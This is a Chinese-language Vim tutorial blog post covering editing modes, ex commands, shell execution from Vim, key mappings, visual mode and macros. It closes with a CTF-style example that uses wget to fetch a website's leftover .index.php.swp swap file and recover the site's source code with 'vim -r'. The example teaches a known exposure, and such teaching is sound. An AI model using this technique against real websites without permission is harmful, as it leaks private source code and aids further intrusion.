SPACE，退格键，删除光标前一个字符 DEL，删除键，删除光标后一个字符 方向键，在文本中移动光标 HOME/END，移动光标到行首/行尾 Page Up/Page Down，上/下翻页 Insert，切换光标为输入/替换模式，光标将变成竖线/下划线 ESC，退出输入模式，切换到命令模式 替换模式 进入替换模式 R \u0026ndash; 进入替换模式，此时新输入的文本将直接替代/覆盖已经存在的内容，点击ESC键返回常规模式\nr \u0026ndash; 进入单字符替换模式，此时新输入的字符将替代光标之下的当前字符，然后自动返回到常规模式\ngR \u0026ndash; 进入虚拟替换模式，其与替换模式最主要的区别在于，对\u0026lt;Tab\u0026gt;键和换行符的不同处理方式\ngr \u0026ndash; 进入单字符虚拟替换模式，在替换光标下的当前字符之后，将自动返回到常规模式\n虚拟替换模式 \u0026lt;Tab\u0026gt;键\n替换模式（REPLACE）下，在原有\u0026lt;Tab\u0026gt;键处输入字母\u0026rsquo;a\u0026rsquo;，将直接替代\u0026lt;Tab\u0026gt;键所占用的所有空格的位置\n虚拟替换模式（VREPLACE）下，在原有\u0026lt;Tab\u0026gt;键处输入字母\u0026rsquo;a\u0026rsquo;，将仅仅替代单个空格\n\u0026lt;NL\u0026gt;换行\n替换模式（REPLACE）下，输入\u0026lt;Enter\u0026gt;回车键将增加新行：\n虚拟替换模式（VREPLACE）下，输入\u0026lt;Enter\u0026gt;回车键将用新行替代当前行内容（即清空当前行）：\n命令模式 在命令模式下按下 :（英文冒号）就进入了底线命令模式\n有的命令要输入 / 执行\n命令模式常用命令 :w \u0026ndash; 保存文件 :q \u0026ndash; 退出 Vim 编辑器 :wq \u0026ndash; 保存文件并退出 Vim 编辑器 :q! \u0026ndash; 强制退出Vim编辑器，不保存修改 :set nu \u0026ndash; 显示行号 :set nonu \u0026ndash; 取消行号 :n \u0026ndash; 定位到第n行 :n1,n2d \u0026ndash; 删除行号n1至n2之间的内容（n1和n2都代表数字） 按 ESC 键可随时退出底线命令模式\n命令模式处理文件 :w [filename] \u0026ndash; 将编辑的数据储存成另一个文件（类似另存新档） :r [filename] \u0026ndash; 在编辑的数据中，读入另一个档案的数据，即将filenam的内容加到光标所在行后面 :n1,n2 w [filename] \u0026ndash; 将 n1 到 n2 的内容储存成 filename 命令模式搜索文本 ?{目标字符串} \u0026ndash; 向光标之上寻找一个目标字符串 /{目标字符串} \u0026ndash; 向光标之下寻找一个目标字符串 n \u0026ndash; 重复前一个搜寻的动作 N \u0026ndash; 反向进行前一个搜寻动作 :set ic \u0026ndash; 编辑器将不会区分大小写 :set noic \u0026ndash; 编辑器将区分大小写 命令模式替换文本 格式：:(作用范围)s/{目标}/{替换}(/替换的标志)\n替换的作用范围\n标志 作用 s 当前行替换 %s 全文替换 n1,n2s 指定行替换，替换n1到n2间所有行的目标，n2可以是$，代指最后一行 \u0026rsquo;\u0026lt;,\u0026rsquo;\u0026gt;s 指定区域替换 替换的标志\n标志 作用 [无] 只替换作用范围内，每行第一次出现的目标 g 一次性替换所有作用范围内所有的目标 i 大小写不敏感查找 I 大小写敏感查找 c 对作用范围内的目标逐个替换，替换前需进行确认 替换标志可以使用多个，比如/gic\n命令模式执行linux命令 :![command]\n打开终端窗口并打印执行命令的结果，不会改变当前编辑的文件的内容\n可以使用:!bash打开bash shell并执行命令\n:!date\t//执行 date 命令显示时间，执行完命令以后按下键盘上的 Enter 就会返回到文件 :r ![command]\n将shell命令command的结果插入到当前行的下一行\n:r !date\t//读取系统时间并插入到当前行的下一行 n1,n2 ![command]\n将n1至n2行范围内的内容交给命令command处理，并将处理结果替换起始行号和结束行号指定范围中的内容\n:1,4 !sort\t//将第1行到第4行的内容进行排序 可以只指定起始行\n:1 !tr [a-z] [A-Z]\t//将第1行的小写字母转为大写字母 可以用.表示当前光标所在行 (输入!!会变成:.!)\n:. !tr [a-z] [A-Z]\t//将当前行的小写转为大写 n1,n2 w ![command]\n将起始行号和结束行号所指定范围的内容作为命令command的输入，不会改变当前编辑的文件的内容\n可以使用:1 w !bash，将会把第1行的内容作为bash命令来执行并显示结果，而且不会改变当前编辑的文件的内容\n同样的 : . w !bash将当前行的内容作为bash命令来执行\n!!\n重新执行最近一次运行过的命令\n:shell / :terminal\n打开命令终端（输入exit结束并返回vim）\n使用:version命令（按q退出），查看是否包含+terminal关键字，以确认是否能使用 :terminal\n命令模式定义快捷键 基本格式\n模式 基本格式 描述 普通模式 :nmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 仅在普通模式下有效，定义普通模式下的快捷键 插入模式 :imap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义插入模式下的快捷键 可视模式 :vmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义可视模式下的快捷键 命令行模式 :cmap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 用于定义命令行模式下的快捷键 总体映射 :map \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 定义快捷键，适用于普通、可视、操作和选择模式，但不建议用于有冲突的情况。 总体不可递归映射 :noremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 类似:map，但是不会递归地扩展已经存在的映射，避免意外行为。 普通模式不可递归 :nnoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在普通模式下使用，避免递归映射 插入模式不可递归 :inoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在插入模式下使用，避免递归映射 可视模式不可递归 :vnoremap \u0026lt;key\u0026gt; \u0026lt;command\u0026gt; 在可视模式下使用，避免递归映射 缩写 :ab [缩写] [完整文本] 输入缩写后空格，自动扩展为完整文本。例如：:ab email xxxx@gmail.com 什么是\u0026lt;key\u0026gt;？\n\u0026lt;key\u0026gt; 对应的是 ^[A-Z] ， 定义快捷键时使用ctrl+v+[a-z]，使用快捷键时用对应的ctrl+[a-z]\n什么是递归映射？\n:nmap j gg :nmap Q j 如果已经做了以上映射，那么按下Q，执行的将是gg而不是j\n为了避免以上问题，应该这样定义：\n:nnoremap j gg :nnoremap Q j 几个例子\n:map ^D Ahelloworld\u0026lt;ESC\u0026gt; 在文件的光标所在行的行尾，添加 helloworld 字符串，按住组合键 ctrl + d 就会执行操作\n:map ^M I#\u0026lt;ESC\u0026gt; 在文件光标处所在行的行首插入#，按住组合键 ctrl + m 就会执行操作\n:ab email xxxx@gmail.com 输入 email+空格 会把输入的 email 自动替换成 xxxx @gmail.com\n可视化模式 进入可视化模式 可视化模式可以分为以下三种：\nv \u0026ndash; 字符可视化模式，文本选择是以字符为单位的 V \u0026ndash; 行可视化模式，文本选择是以行为单位的 ctrl-V \u0026ndash; 块可视化模式，可以选择一个矩形内的文本 在任意可视化模式下使用以上命令，将会切换到对应模式\n在任意可视化模式下使用I（大写i），将会切换到插入模式\ngv \u0026ndash; 进入上一次的可视化模式，并选中当时选中的文本**（命令模式也能用此命令）** 按 ESC 键可随时退出可视化模式\n可视化模式下移动光标 命令模式下的光标移动方法仍然适用\n进入任意可视化模式，移动光标，会从当前位置开始，以相应方式高亮选中字符\no \u0026ndash; 移动光标到已经选取的文本的结尾处或者开头处（根据现在光标所在位置确定）\n如果是块可视化模式，移动光标到对角处 O \u0026ndash; 在块可视化模式下，移动光标到同一行的结尾处或者开头处\n可视化模式下编辑 大部分命令模式对内容操作的命令都能在可视化模式下使用，比如：\nd \u0026ndash; 删除高亮文本\nD \u0026ndash; 删除一整行文本，即使只有一部分被选中了\nc \u0026ndash; 删除高亮文本并进入插入模式\ny \u0026ndash; 复制高亮文本\nY \u0026ndash; 复制一整行文本\np \u0026ndash; 黏贴复制的文本\n~ \u0026ndash; 对高亮文本进行大小写转换\n\u0026gt; / \u0026lt; \u0026ndash; 对高亮文本增加/减少缩进，幅度为一个Tab键\nr \u0026ndash; 输入单个字符，把高亮文本所有字符逐个替换为该字符\nvim宏录制 宏录制的录制操作 假设需要将文本的每一行的行首插入入一个 tab 键\n先将光标移动到第一行，在普通模式下按下 q 键（宏录制是 q 键启动的) 按一个 a （字母随意）,表示该宏注册为 a 按下 I 在行首插入一个 tab 键 按下ESC退出编辑模式 按下 j 将光标移动到下一行行首 按下 q 键完成录制操作（宏录制是 q 键结束的） 主要步骤：q(开始）-\u0026gt; a(命名) -\u0026gt; 操作 -\u0026gt; q(结束)\n宏录制的使用 @a \u0026ndash; 执行a宏录制的一系列动作，注意a是录制的操作名称 n@a \u0026ndash; 执行n次a宏 @@ \u0026ndash; 重复上一次使用的宏操作 VIM相关案例 vim缓存泄露 vim交换文件 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n现在用vim打开文件1.txt，直接关闭终端，再次试图用vim打开1.txt时会出现如下提示：\n选择恢复（R），弹出如下提示：\nVim 中，当处理同一个文件发生多次异常退出时，它会依次使用不同的后缀来命名交换文件。按照你给出的模式，首次产生的交换文件名为 .index.php.swp，再次意外退出后产生 .index.php.swo，第三次产生的交换文件为 .index.php.swn。\n从第四次开始及之后的交换文件，Vim 会循环使用这三个后缀（.swp, .swo, .swn）\n例题 使用以下命令获取网站中的vim文件缓存：\nwget http://xxx/.index.php.swp -P /home //-P指定下载位置 使用vim -r恢复文件并打开:\nvim -r .index.php.swp 获取到网站源码后，进行代码审计即可\n","date":"2025-05-08T15:28:02+08:00","image":"http://picture.928330.xyz/typora/DeWatermark.ai_1756040226707.jpeg","permalink":"https://blog.928330.xyz/p/vim%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%8C%E5%85%A8%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/","title":"Vim编辑器完全使用教程"}]